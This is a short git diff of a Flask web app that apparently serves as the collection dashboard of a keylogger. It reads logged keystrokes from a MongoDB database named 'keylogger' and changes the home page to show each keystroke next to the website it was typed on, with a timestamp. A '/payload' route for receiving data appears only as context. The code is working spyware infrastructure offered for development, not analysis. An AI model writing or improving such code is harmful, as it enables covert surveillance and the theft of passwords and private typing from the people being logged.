@@ -23,8 +23,10 @@ keylogs = []  # List to store keylogs
 # MongoDB connection
 client = pymongo.MongoClient("mongodb://localhost:27017/")
 db = client["keylogger"]
-keystroke_collection = db["keystrokes"]
-site_collection = db["sites"]
+# keystroke_collection = db["keystrokes"]
+# site_collection = db["sites"]
+site_logs_collection = db["logs"]
+
 
 # @app.route('/')
 # def home():
@@ -34,16 +36,14 @@ site_collection = db["sites"]
 @app.route('/')
 def home():
     # Fetch keystrokes and visited sites from MongoDB
-    keystrokes = keystroke_collection.find({})
-    sites = site_collection.find({})
+    logs = site_logs_collection.find({})
+    
+    formatted_site_logs = [f"<{log['site']}> [{log['timestamp']}] > {log['keystroke']}" for log in logs]
 
-    # Format keystrokes and sites data for display
-    keystrokes_data = [f"[{keystroke['timestamp']}] > {keystroke['keystroke']}" for keystroke in keystrokes]
-    sites_data = [f"[{site['timestamp']}] > {site['site']}" for site in sites]
 
     formatted_logs = format_logs(keylogs)
     
-    return render_template('index.html', logs=formatted_logs,keystrokes=keystrokes_data, sites=sites_data)
+    return render_template('index.html', logs=formatted_logs,site_logs=formatted_site_logs)
 
 
 @app.route('/payload', methods=['GET', 'POST'])
